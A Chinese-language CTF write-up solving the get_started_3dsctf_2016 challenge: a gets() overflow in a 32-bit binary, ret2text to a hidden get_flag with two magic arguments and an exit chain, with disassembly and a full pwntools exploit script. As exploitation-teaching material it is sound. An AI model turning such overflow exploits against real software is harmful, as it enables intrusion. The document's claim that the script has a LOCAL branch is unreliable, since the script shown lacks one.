# Speedrun：get_started_3dsctf_2016

> 题型：ret2text / 32 位静态 ELF / 隐藏后门  
> 目标：跳到未被调用的 `get_flag(int, int)`，打印 `flag.txt`  
> 关键：偏移 **56**；参数 **0x308cd64f**、**0x195719d1**；返回接 **exit**

> ⚠️ **复现提示（2026-11-23 审计）**：EXP 的远程 `HOST` 是 2019 年 CTF²
> 的临时靶机（已下线），但脚本**带 `LOCAL` 分支**。本地复现：
>
> ```bash
> cd '/home/yfhd5/Pwn_Writeups/ret2text'
> echo 'flag{LOCAL}' > flag.txt
> python 05_get_started_3dsctf_2016_exp.py LOCAL
> ```
>
> 二进制 `get_started_3dsctf_2016` 已归档在同目录。

---

## 0. 一句话结论

```text
gets() 栈溢出
  → 56 字节覆盖返回地址
  → 跳 get_flag@0x080489a0
  → 伪造两个参数：0x308cd64f、0x195719d1
  → get_flag 的返回地址接 exit@0x0804e6a0
  → exit 刷新 stdout，flag 到达远端
```

关键地址：

| 符号 | 地址 |
| --- | --- |
| `main` | `0x08048a20` |
| `get_flag` | `0x080489a0` |
| `exit` | `0x0804e6a0` |

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2text'

file get_started_3dsctf_2016
checksec --file=get_started_3dsctf_2016
nm -n get_started_3dsctf_2016 | grep -E ' (main|get_flag|exit)$'
objdump -d -M intel get_started_3dsctf_2016 | sed -n '/<main>:/,/^$/p'
objdump -d -M intel get_started_3dsctf_2016 | sed -n '/<get_flag>:/,/^$/p'
```

关键输出：

```text
ELF 32-bit LSB executable, Intel i386, statically linked, not stripped
NX enabled
No canary found
No PIE (0x8048000)
Not stripped

08048a20 T main
080489a0 T get_flag
0804e6a0 T exit
```

读法：

| 特征 | 结论 |
| --- | --- |
| 32 位 i386 | cdecl，参数在栈上，4 字节为单位 |
| statically linked | libc 在二进制里，不需要 leak libc |
| No PIE | 函数地址可硬编码 |
| No canary | 可覆盖返回地址 |
| NX enabled | 不能执行栈上 shellcode，优先 ret2text |
| Not stripped | `nm` 直接暴露 `get_flag`，省去逆向找后门 |

再确认后门没有被正常调用：

```bash
objdump -d -M intel get_started_3dsctf_2016 | grep -cE 'call.*80489a0'
# 输出 0
```

> 0 交叉引用 = 隐藏后门，只能靠溢出进入。

---

## 2. 关键逆向

### 2.1 `main`：漏洞点

```asm
08048a20 <main>:
 8048a20: sub    esp,0x3c
 8048a23: mov    DWORD PTR [esp],0x80bc391   ; "Qual a palavrinha magica?"
 8048a2a: call   _IO_printf
 8048a2f: lea    eax,[esp+0x4]               ; buf
 8048a33: mov    DWORD PTR [esp],eax
 8048a36: call   _IO_gets                    ; 漏洞点
 8048a3b: xor    eax,eax
 8048a3d: add    esp,0x3c
 8048a40: ret
```

偏移：

```text
sub esp,0x3c
buf 从 esp+0x04 开始
saved EIP 在 esp+0x3c

offset = 0x3c - 0x04 = 0x38 = 56 字节
```

注意：这里没有 `push ebp`，编译器用了 `-fomit-frame-pointer`，不要套 64 位的 `buf + saved rbp + ret` 公式。

### 2.2 `get_flag`：隐藏后门

```asm
080489a0 <get_flag>:
 80489a0: push   esi
 80489a1: sub    esp,0x8
 80489a4: cmp    DWORD PTR [esp+0x10],0x308cd64f
 80489ac: jne    ...
 80489ae: cmp    DWORD PTR [esp+0x14],0x195719d1
 80489b6: jne    ...
 80489b8: mov    DWORD PTR [esp+0x4],0x80cdd68    ; "rt"
 80489c0: mov    DWORD PTR [esp],0x80bc388        ; "flag.txt"
 80489c7: call   _IO_new_fopen
 ...
 80489f3: call   putchar
 ...
 8048a10: call   _IO_new_fclose
 8048a19: ret
```

一眼得到：

- `arg1 = 0x308cd64f`
- `arg2 = 0x195719d1`
- 打开 `flag.txt`，逐字节 `putchar`
- `0x080bc388` 是 `"flag.txt"`，`0x080cdd68` 是 `"rt"`

---

## 3. cdecl 参数布局

`main` 执行 `ret` 后进入 `get_flag`，此时栈顶记为 `E`：

```text
E+0x00 : get_flag 的返回地址 → 填 exit
E+0x04 : arg1 = 0x308cd64f
E+0x08 : arg2 = 0x195719d1
```

`get_flag` 执行 `push esi; sub esp,8` 后，`esp = E - 0x0c`，所以：

```text
[esp+0x10] = [E+0x04] = arg1
[esp+0x14] = [E+0x08] = arg2
```

正好对上两条 `cmp`。因此 payload 顺序必须是：

```text
56 字节填充
get_flag 地址
exit 地址
arg1
arg2
```

---

## 4. 最终 payload

```python
from pwn import *

context.arch = "i386"

GET_FLAG = 0x080489a0
EXIT     = 0x0804e6a0
ARG1     = 0x308cd64f
ARG2     = 0x195719d1

payload = flat(
    b"A" * 0x38,      # 56 B
    p32(GET_FLAG),    # 覆盖 saved EIP
    p32(EXIT),        # get_flag 的返回地址
    p32(ARG1),        # arg1
    p32(ARG2),        # arg2
)
```

总长度：

```text
56 + 4 + 4 + 4 + 4 = 72 字节
```

---

## 5. 为什么必须接 `exit`

`get_flag` 用 `putchar` 输出 flag。远端 socket 不是 tty，stdout 是**全缓冲**：

```text
putchar → stdout 用户态缓冲区
```

如果 `get_flag` 直接 `ret` 到非法地址，进程 SIGSEGV，缓冲区不会刷新，flag 丢失。

接 `exit` 后：

```text
exit
 → __run_exit_handlers
 → _IO_cleanup
 → flush 所有 stdio 流
 → flag 真正写入 socket
```

所以：

```python
p32(EXIT)
```

不是可选项，是标准解法的一部分。

### 本地实测细节

用显式管道：

```python
p = process("./get_started_3dsctf_2016",
            stdin=PIPE, stdout=PIPE, stderr=STDOUT)
```

结果：

| payload 尾部 | 输出 |
| --- | --- |
| `p32(0xdeadbeef) + args` | `b''`，什么都没有 |
| `p32(0x0804e6a0) + args` | `b'Qual a palavrinha magica? flag{...}\n'` |

原因：显式 `stdout=PIPE` 时是全缓冲，不接 `exit` 就丢 flag。  
有时本地默认 `process()` 会给 stdout 分配 tty，变成行缓冲，flag 里的换行会顺带 flush，看起来“不接 exit 也能出”；**远端 socket 不要赌这个行为**。

另外不要接 `_exit`：`_exit` 不执行 stdio 清理，不会 flush。

---

## 6. 完整 exp

```python
from pwn import *
import ssl, re

context.arch = "i386"
context.os = "linux"
context.log_level = "info"

HOST = "74c46cbae80d28d180233a3b.tcp-ctf2.dasctf.com"
PORT = 9999

GET_FLAG = 0x080489a0
EXIT     = 0x0804e6a0
ARG1     = 0x308cd64f
ARG2     = 0x195719d1

def build_payload():
    return flat(
        b"A" * 0x38,
        p32(GET_FLAG),
        p32(EXIT),
        p32(ARG1),
        p32(ARG2),
    )

def exploit():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    p = remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    # 提示语没有换行，非 tty 时会被全缓冲；不要 recvuntil 等它
    p.sendline(build_payload())

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:CTF2|flag|DASCTF)\{[^}]+\}", out)
    if flags:
        print(f"[🎉] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] Flag not found, raw output above")

if __name__ == "__main__":
    exploit()
```

本地复现：

```bash
mkdir -p /tmp/gs_exp
cp get_started_3dsctf_2016 05_get_started_3dsctf_2016_exp.py /tmp/gs_exp/
printf 'flag{local_validation_0k}\n' > /tmp/gs_exp/flag.txt
cd /tmp/gs_exp
python 05_get_started_3dsctf_2016_exp.py LOCAL
```

---

## 7. 交互坑

1. **不要 `recvuntil` 提示语**
   提示语没有换行，非 tty 时会被 stdio 全缓冲，可能一直等不到。  
   直接 `sendline(payload)` 最快。

2. **`gets` 可以接收 `\x00`**
   32 位地址里的 `\x00` 不会截断输入；只有换行会结束读取。  
   `sendline` 正好。

3. **i386 不需要栈对齐 gadget**
   不要套用 amd64 的 `ret` 对齐技巧；x86-32 的 cdecl 没有 16 字节对齐崩溃问题。

4. **远端要 TLS**
   CTF² 用 `ssl=True` + 关闭证书校验；否则容易 `EOFError`。

5. **本地要有 `flag.txt`**
   `get_flag` 用相对路径，进程 CWD 下必须有 `flag.txt`，否则 `getc(NULL)` 崩溃。

6. **不要用 `_exit`**
   `_exit` 不刷新 stdio；必须用 `exit`。

7. **不要接 `0xdeadbeef` 之类的假返回地址**
   本地 tty 行缓冲可能“看起来能出”，远端全缓冲会丢 flag。

---

## 8. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `nm`：32 位静态、无 PIE、无 canary、有 `get_flag` |
| 0:20–0:50 | `objdump` 看 `main/get_flag`：拿到偏移 56、magic、`flag.txt` |
| 0:50–1:20 | 写 72 字节 payload：`56 + get_flag + exit + arg1 + arg2` |
| 1:20–1:40 | 本地验证：`python 05_get_started_3dsctf_2016_exp.py LOCAL`，看到 flag 即成功 |
| 1:40–2:00 | 远端：`python 05_get_started_3dsctf_2016_exp.py`，TLS 连上去直接拿 flag |

---

## 9. 题型识别卡

```text
Not stripped + nm 看到 get_flag
+ 静态链接 / No PIE / No canary
+ main 里 gets(buf) 且 buf 在 esp+4
+ get_flag 有两个 magic 参数
= ret2text，offset 56，参数 0x308cd64f / 0x195719d1，尾部接 exit
```

一句话：**`56 + p32(get_flag) + p32(exit) + p32(arg1) + p32(arg2)`，不要省 `exit`。**

